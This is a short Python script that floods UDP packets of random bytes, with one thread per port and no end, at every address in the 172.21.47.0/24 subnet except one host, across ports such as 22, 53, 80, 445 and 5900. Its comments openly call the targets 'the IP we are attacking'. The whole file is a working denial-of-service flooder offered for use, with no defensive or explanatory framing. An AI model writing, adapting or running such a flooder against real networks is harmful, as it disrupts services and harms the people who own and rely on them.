import socket #Imports needed libraries
import random
import threading


def run(ip, port):
    sent = 0
    while 1: #Infinitely loops sending packets to the port until the program is exited.
        sock.sendto(bytes,(ip,port))
        # try:
        #     udp.sendto(buf, ('8.8.8.8', 12345))
        #     break
        # except OSError, exc:
        #     if exc.errno == 55:
        #         time.sleep(0.1)
        #     else:
        #         raise
        # print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
        sent= sent + 1
    return

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
concat = "172.21.47."
ports = [22, 23, 53, 80, 88,445, 443,515,631,1720, 2002,3283, 3702, 4433, 5000, 5900,5961,5962]
threads=[]
for i in range(0, 255):
    if i == 89:
        continue
    ip=concat + str(i) #The IP we are attacking
    for j in ports:
        thread2 = threading.Thread(target=run, args=(ip, j,))
        threads.append
        thread2.start()